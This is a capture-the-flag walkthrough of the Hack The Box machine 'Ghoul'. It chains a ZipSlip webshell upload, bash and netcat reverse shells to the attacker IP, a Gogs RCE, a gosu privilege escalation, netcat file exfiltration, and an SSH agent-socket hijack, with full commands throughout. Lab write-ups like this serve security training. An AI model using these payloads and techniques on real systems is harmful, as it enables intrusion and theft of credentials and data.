# HTB: Ghoul — Comprehensive Walkthrough

**Target:** `10.129.10.52`  
**Attacker:** `10.10.16.84` (Kali)  
**Difficulty:** Hard  
**Key Concepts:** ZipSlip, Container Pivoting, SSH Key Cracking, Git Forensics, SSH Agent Hijacking, Gogs RCE

---

## Table of Contents

1. [The Big Picture: What Are We Facing?](#the-big-picture)
2. [Phase 1: Reconnaissance — Mapping the Battlefield](#phase-1-recon)
3. [Phase 2: The Tomcat Upload (ZipSlip)](#phase-2-zipslip)
4. [Phase 3: Post-Exploitation on Aogiri (Container 1)](#phase-3-aogiri)
5. [Phase 4: Pivot to kaneki-pc (Container 2)](#phase-4-kaneki-pc)
6. [Phase 5: Discovering and Tunneling to Gogs (Container 3)](#phase-5-gogs)
7. [Phase 6: Exploiting Gogs for RCE](#phase-6-gogs-rce)
8. [Phase 7: Privilege Escalation on Gogs (gosu)](#phase-7-gosu)
9. [Phase 8: Git Forensics — Finding the Hidden Password](#phase-8-git-forensics)
10. [Phase 9: Root on kaneki-pc](#phase-9-root-kaneki-pc)
11. [Phase 10: SSH Agent Hijacking — The Final Leap](#phase-10-agent-hijack)
12. [Flags](#flags)
13. [Key Takeaways & Hacker Mindset](#takeaways)

---

## The Big Picture: What Are We Facing?

**Hacker Mindset:** Before touching anything, understand the architecture. Ghoul isn't a single machine — it's a **nested Docker environment**. This means:
- The IP `10.129.10.52` is the **Docker host** (the physical/virtual machine running the box)
- Inside it are multiple containers: **Aogiri** (web), **kaneki-pc** (intermediate), **Gogs** (git server)
- There is NO user.txt or root.txt on the first container we pop. The flags live deeper.

**Why this matters:** You cannot treat this like a normal box. Every shell you get is just a stepping stone. Your goal isn't just to "get root" — it's to **traverse the network** and find where the data actually lives.

---

## Phase 1: Reconnaissance — Mapping the Battlefield

### The Command
```bash
nmap -sT -p- --min-rate 10000 10.129.10.52
```

**Hacker Mindset:** Why `--min-rate 10000`? Because HTB boxes are often behind a VPN with decent bandwidth. We want speed. We also use `-sT` (TCP connect) because it doesn't require root privileges for SYN scans and is reliable over VPNs.

### Results
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  ssh
8080/tcp open  http-proxy
```

**Critical Observations:**
1. **Two SSH ports (22 and 2222)** — This is a HUGE red flag. Normal boxes don't run two SSH daemons unless they're forwarding into different containers. The versions are even different (`4ubuntu0.1` vs `4ubuntu0.2`).
2. **Two HTTP ports (80 and 8080)** — Port 80 is Apache. Port 8080 is Tomcat. Two web servers usually means two different applications, possibly in different containers.

**Conclusion:** We're definitely dealing with Docker containers. Port 80/22 likely go to Container A. Port 8080 might be another service on Container A, or a gateway to something else. We enumerate both.

### Version Scan
```bash
nmap -sC -sV -p 22,80,2222,8080 10.129.10.52
```

**Key findings:**
- Port 80: `Apache httpd 2.4.29`, title: "Aogiri Tree"
- Port 8080: `Apache Tomcat/7.0.88`, HTTP Basic Auth realm="Aogiri"

**Hacker Mindset:** The shared realm name "Aogiri" tells us these services are related. They're probably part of the same application ecosystem. Tomcat on 8080 with Basic Auth means there's likely an admin panel or upload functionality.

---

## Phase 2: The Tomcat Upload (ZipSlip)

### Web Enumeration on Port 80
Browsing to `http://10.129.10.52` reveals a Tokyo Ghoul-themed website. Key findings:
- `/secret.php` — Contains a simulated chat log. In the chat, we see: `ILoveTouka` (a potential password), mentions of a "fake art site" for uploads, and hints about RCE.
- `/users/login.php` — A login portal. We could brute force this, but it's a rabbit hole (hardcoded weak creds exist but lead to nothing useful).

**Hacker Mindset:** Always read the source material. The chat log isn't just flavor text — it's **intelligence**. `ILoveTouka` is a password we'll need later. The "fake art site" is pointing us to port 8080.

### Port 8080: The Tomcat App
Accessing `http://10.129.10.52:8080` prompts for HTTP Basic Auth.

**Hacker Mindset:** Before firing up Hydra or Burp, try the stupid stuff. `admin:admin` works.

The Tomcat app is an image upload gallery. There are three upload panels:
1. Image upload (JPEG only, signature checked)
2. Text upload
3. **ZIP upload** — This is our target.

### The Vulnerability: ZipSlip
When you upload a ZIP file, the Java backend extracts it. The vulnerability is that it **does not sanitize path traversal sequences** (`../../..`) inside the ZIP entries.

**Why this works:** ZIP files store relative paths. If you craft a ZIP containing a file named `../../../../../../var/www/html/shell.php`, the Java extractor will write that file to the absolute path `/var/www/html/shell.php` — **as the user running Tomcat**.

**Hacker Mindset:** Checking running processes with `ps aux` later reveals Tomcat runs as **root**. This is an unintended (but game-breaking) configuration. It means our ZipSlip gives us **arbitrary file write as root**.

### Exploitation Steps

**1. Create a PHP webshell:**
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /tmp/shell.php
```

**2. Create the malicious ZIP:**
```python
import zipfile
with zipfile.ZipFile("/tmp/shell.zip", "w") as z:
    z.write("/tmp/shell.php", "../../../../../../var/www/html/shell.php")
```

**3. Verify:**
```bash
unzip -l /tmp/shell.zip
# Should show: ../../../../../../var/www/html/shell.php
```

**4. Upload:**
```bash
curl -u admin:admin -F 'data=@/tmp/shell.zip' http://10.129.10.52:8080/upload
```

**5. Trigger reverse shell:**
```bash
# On Kali
nc -lvnp 443

# Trigger
curl http://10.129.10.52/shell.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.84/443 0>&1'"
```

**Result:** We get a shell as `www-data` on the Aogiri container.

---

## Phase 3: Post-Exploitation on Aogiri (Container 1)

### Confirming We're in a Container
```bash
ls -la /
# .dockerenv exists

grep -i docker /proc/self/cgroup
# Multiple docker:/ paths
```

**Hacker Mindset:** `.dockerenv` and cgroup paths confirm containerization. This means:
- The "real" machine is the Docker host
- There are likely other containers on internal networks
- We need to find internal IPs and pivot

### Finding SSH Keys
```bash
ls /var/backups/backups/keys/
# eto.backup  kaneki.backup  noro.backup
```

All three are RSA private keys. `eto.backup` and `noro.backup` are unencrypted. `kaneki.backup` is **encrypted**.

**Hacker Mindset:** Why check `/var/backups`? Because admins back up sensitive data and sometimes forget to secure it. Keys in backups are a goldmine. The fact that one is encrypted means it's probably more valuable — people only encrypt what they care about.

### Cracking kaneki's Key
The passphrase is `ILoveTouka` — found in the `/secret.php` chat screenshot.

**On Kali:**
```bash
chmod 600 kaneki.backup
ssh -i kaneki.backup kaneki@10.129.10.52
# Passphrase: ILoveTouka
```

**Why SSH back into the same IP?** Because `10.129.10.52:22` forwards to the Aogiri container. Logging in as `kaneki` gives us a proper user shell with a home directory and better privileges than `www-data`.

### Inside /home/kaneki
```bash
cat note.txt
# Vulnerability in Gogs was detected. I shutdown the registration function on our server...

cat notes
# I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc.

cat user.txt
# [USER FLAG - we'll grab this later or from the host]
```

**Hacker Mindset:** These notes are breadcrumbs. They tell us:
1. There's a **Gogs** server somewhere
2. There's a **"server's network"** — another subnet
3. "kaneki's pc" is a thing — probably another container

---

## Phase 4: Pivot to kaneki-pc (Container 2)

### Discovering kaneki-pc
In `/home/kaneki/.ssh/authorized_keys`, we see:
```
ssh-rsa ... kaneki_pub@kaneki-pc
ssh-rsa ... kaneki@Aogiri
```

**Hacker Mindset:** The `authorized_keys` file tells us two things:
1. A key for `kaneki_pub@kaneki-pc` is trusted. This means there's a machine called `kaneki-pc` and a user `kaneki_pub`.
2. The same private key (`kaneki.backup`) likely works for both identities.

### Internal Network Scan
```bash
for i in {1..254}; do (ping -c 1 172.20.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```

Results:
- `172.20.0.1` — Docker gateway
- `172.20.0.10` — Ourselves (Aogiri)
- `172.20.0.150` — **kaneki-pc**

**Hacker Mindset:** We use `ping` instead of `nmap` because `nmap` might not be installed in the container. Bash loops with `ping` are universally available. Always adapt to your environment.

### Pivoting via SSH
```bash
ssh -i /home/kaneki/.ssh/id_rsa kaneki_pub@172.20.0.150
# Passphrase: ILoveTouka
```

**Result:** `kaneki_pub@kaneki-pc`

**Hacker Mindset:** This is **lateral movement**. We're using legitimate credentials (stolen keys) to move between systems. This is quieter than exploiting new vulnerabilities. Always prefer "living off the land" when possible.

---

## Phase 5: Discovering and Tunneling to Gogs (Container 3)

### Network Enumeration on kaneki-pc
```bash
ifconfig
```
Shows `eth1` with `172.18.0.200`. New subnet!

```bash
for i in {1..254}; do (ping -c 1 172.18.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```

Results:
- `172.18.0.1` — Docker gateway (the actual host!)
- `172.18.0.2` — Another container
- `172.18.0.200` — Ourselves

Port check on `172.18.0.2`:
```bash
bash -c 'exec 3<>/dev/tcp/172.18.0.2/3000 && echo "open"'
# open
```

**Hacker Mindset:** We can't run `nmap`, so we use bash's built-in `/dev/tcp` feature. This is a classic container trick. Every bash shell is a port scanner if you know how to use it.

### Setting Up Double SSH Tunnels
Kali can't reach `172.18.0.2` directly. We need to tunnel through Aogiri, then through kaneki-pc.

**Tunnel 1 (Kali → Aogiri → kaneki-pc SSH):**
```bash
ssh -L 2222:172.20.0.150:22 -N -i ~/kaneki.backup kaneki@10.129.10.52
```

**Tunnel 2 (Kali → kaneki-pc → Gogs):**
```bash
ssh -p 2222 -L 3000:172.18.0.2:3000 -N -i ~/kaneki.backup kaneki_pub@127.0.0.1
```

**Hacker Mindset:** This is **tunnel chaining**. Think of SSH tunnels as pipes. The first pipe connects Kali's port 2222 to kaneki-pc's port 22. The second pipe connects Kali's port 3000 to Gogs' port 3000, but travels through the first pipe. This is how you access internal networks without ever being "on" them.

**Result:** Browse to `http://127.0.0.1:3000` on Kali → Gogs login page.

---

## Phase 6: Exploiting Gogs for RCE

### Gogs Background
Gogs is a self-hosted Git service (like GitHub Enterprise). Version **0.11.66** has two critical CVEs:
- **CVE-2018-18925:** Pre-auth path traversal in file uploads (session hijacking)
- **CVE-2018-20303:** Authenticated path traversal to write session files

Combined, these allow an attacker to forge an **admin session cookie** and then use Git hooks for RCE.

### Authentication
Credentials from `/usr/share/tomcat7/conf/tomcat-users.xml` on Aogiri:
- `aogiritest:test@aogiri123`

**Hacker Mindset:** Password reuse is real. Admins reuse passwords across services. Always collect every credential you find and try them everywhere.

### Using gogsownz
We use the [gogsownz](https://github.com/TheZ3ro/gogsownz) tool, with some patches for Python 3 compatibility and case-sensitivity issues.

**The patched script:**
```python
# Changes applied:
# 1. iterkeys() -> keys() (Python 3)
# 2. len(cookies) != 1 -> len(cookies) < 1 (handle multiple cookies)
# 3. Username checks made case-insensitive
```

**Command:**
```bash
python3 gogsownz.py http://127.0.0.1:3000/ -n i_like_gogits -C "aogiritest:test@aogiri123" -v --rce "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.84 4444 >/tmp/f" --cleanup
```

**What happens under the hood:**
1. Logs in as `aogiritest`
2. Creates a repository
3. Uploads a forged admin session file via path traversal
4. Commits the file (writing it to the session store)
5. Swaps to the admin session (now logged in as `kaneki`, who is admin)
6. Creates another repo, sets a Git `post-receive` hook containing our reverse shell
7. Triggers the hook by making a new commit
8. Cleans up the repo evidence

**Result:** Shell as `git` user on the Gogs container.

---

## Phase 7: Privilege Escalation on Gogs (gosu)

### Finding gosu
```bash
find / -perm /4000 2>/dev/null
# /usr/sbin/gosu
```

`gosu` is a SUID binary that runs commands as other users. It's like `sudo` but without configuration files.

**Why is this here?** In Docker containers, `gosu` is commonly used to drop from root to a non-root user when starting services. The developers accidentally left it SUID.

### Exploitation
```bash
gosu root /bin/sh
id
# uid=0(root) gid=0(root)
```

**Hacker Mindset:** SUID binaries are privilege escalation vectors. When you find one, immediately ask: "What does this binary do, and can I abuse it?" `gosu` is literally designed to run commands as other users. Running `gosu root /bin/sh` is trivial.

---

## Phase 8: Git Forensics — Finding the Hidden Password

### The Files in /root
```bash
cd /root
ls
# aogiri-app.7z  session.sh
```

- `session.sh` — A cron script that logs into Gogs as `kaneki:12345ILoveTouka!!!` every 10 minutes. This is a credential, but not the one we need.
- `aogiri-app.7z` — A 7zip archive containing a Java application with a **`.git` directory**.

### Exfiltration to Kali
```bash
# On Kali
nc -lvnp 5555 > aogiri-app.7z

# On Gogs root shell
nc -w 3 10.10.16.84 5555 < /root/aogiri-app.7z
```

### Git Forensics
```bash
7z x aogiri-app.7z
cd aogiri-chatapp
git log --oneline
```

Output shows normal commits. But there's a hidden secret:

```bash
git show ORIG_HEAD
```

`ORIG_HEAD` points to a commit made **before a `git reset --hard`**. It contains:
```diff
-spring.datasource.username=kaneki
-spring.datasource.password=7^Grc%C\7xEQ?tb4
+spring.datasource.username=root
+spring.datasource.password=g_xEN$ZuWD7hJf2G
```

**Hacker Mindset:** Git is a time machine. Even if developers "delete" secrets with new commits, the old data often lives in:
- `ORIG_HEAD`
- `git reflog`
- The `.git/objects` directory

Always check `git reflog` and `git log --all` when you find a repo. Developers panic-delete credentials but forget that Git remembers everything.

**The password `7^Grc%C\7xEQ?tb4` is the root password for kaneki-pc.**

---

## Phase 9: Root on kaneki-pc

Go back to your `kaneki_pub@kaneki-pc` shell:

```bash
su -
Password: 7^Grc%C\7xEQ?tb4
id
# uid=0(root) gid=0(root)
```

**Note:** `/root/root.txt` on kaneki-pc is a **troll**:
```
You've done well to come upto here human. But what you seek doesn't lie here. The journey isn't over yet.....
```

**Hacker Mindset:** HTB loves troll flags. Always verify what you find. The real root flag is on the **host**, not in this container.

---

## Phase 10: SSH Agent Hijacking — The Final Leap

### The Vulnerability
On kaneki-pc, a cronjob runs every 6 minutes as user `kaneki_adm`:
```bash
ssh-agent -s | head -n 1 > /home/kaneki/agent.cf
source /home/kaneki/agent.cf
ssh-add
ssh -tt -A kaneki_adm@172.20.0.150 ssh root@172.18.0.1 -p 2222 -t './log.sh'
```

**What is SSH Agent Forwarding?**
Normally, SSH authenticates using a private key on your local machine. With Agent Forwarding (`-A`), your local machine keeps the private key in memory and exposes a **Unix socket** (`SSH_AUTH_SOCK`) on the remote machine. The remote machine can then use that socket to authenticate to OTHER machines on your behalf, without ever seeing your private key.

**Why this is dangerous:** If you compromise the intermediate machine (kaneki-pc), you can access that socket and impersonate the original user.

### The Hijack
We wait for `kaneki_adm` to connect, steal their socket, and SSH as root to the host.

```bash
while true; do
  export pid=$(ps -u kaneki_adm | grep ssh$ | tr -s ' ' | cut -d' ' -f2);
  if [ ! -z "$pid" ]; then
    export SSH_AUTH_SOCK=$(su kaneki_adm -c "cat /proc/${pid}/environ" | tr '\0' '\n' | grep SSH_AUTH_SOCK | cut -d'=' -f2);
    SSH_AUTH_SOCK="$SSH_AUTH_SOCK" ssh root@172.18.0.1 -p 2222;
    break;
  fi;
  sleep 5;
done
```

**What this does:**
1. Polls for `kaneki_adm` SSH processes
2. When found, reads `/proc/[pid]/environ` (process environment variables) to extract `SSH_AUTH_SOCK`
3. Sets that socket in our environment
4. SSHes to `172.18.0.1:2222` (the Docker host) as `root`
5. The host sees our connection as authenticated by the forwarded agent — **no password needed**

**Result:** `root@ghoul` — the actual host machine.

---

## Flags

| Flag | Location | Value |
|------|----------|-------|
| **user.txt** | `/home/kaneki/user.txt` (on Aogiri container, accessible from host) | `3085394b[redacted]98e0248` |
| **root.txt** | `/root/root.txt` (on the host) | `ee1d9278[redacted]df7d25d` |

---

## Key Takeaways & Hacker Mindset

### 1. Think in Networks, Not Single Hosts
Ghoul is a masterclass in **pivoting**. Every shell is just a hop. Your mental model should be:
> "I am here. What can I see from here? What credentials do I have? Where can I go next?"

### 2. Read Everything
- `secret.php` gave us `ILoveTouka`
- `tomcat-users.xml` gave us `test@aogiri123`
- `.git/ORIG_HEAD` gave us the root password
- Notes and to-do files told us about other containers

**Hacker Mindset:** The developers left breadcrumbs everywhere. Your job is to be a detective.

### 3. Adapt Your Tools to the Environment
When `nmap` and `nc` aren't available in containers, use:
- Bash loops with `ping` for host discovery
- `/dev/tcp/host/port` for port scanning
- `base64` + copy-paste for file transfers
- Python for creating malicious ZIPs

### 4. Git is a Goldmine
Whenever you find a `.git` directory:
- `git log --all`
- `git reflog`
- `git show ORIG_HEAD`
- `git diff HEAD~5`

Developers commit secrets, panic-reset, and forget Git remembers.

### 5. Abuse Legitimate Features
- **ZipSlip** abused Java's legitimate ZIP extraction
- **SSH Agent Forwarding** abused a legitimate convenience feature
- **gosu** abused a legitimate container administration tool

**Hacker Mindset:** You don't always need a CVE. Sometimes the "vulnerability" is just a feature used in an unexpected way.

### 6. Be Patient
The SSH agent hijack required waiting up to 6 minutes. In real-world pentesting, persistence and patience separate good hackers from great ones.

---

**Machine Pwned.** 
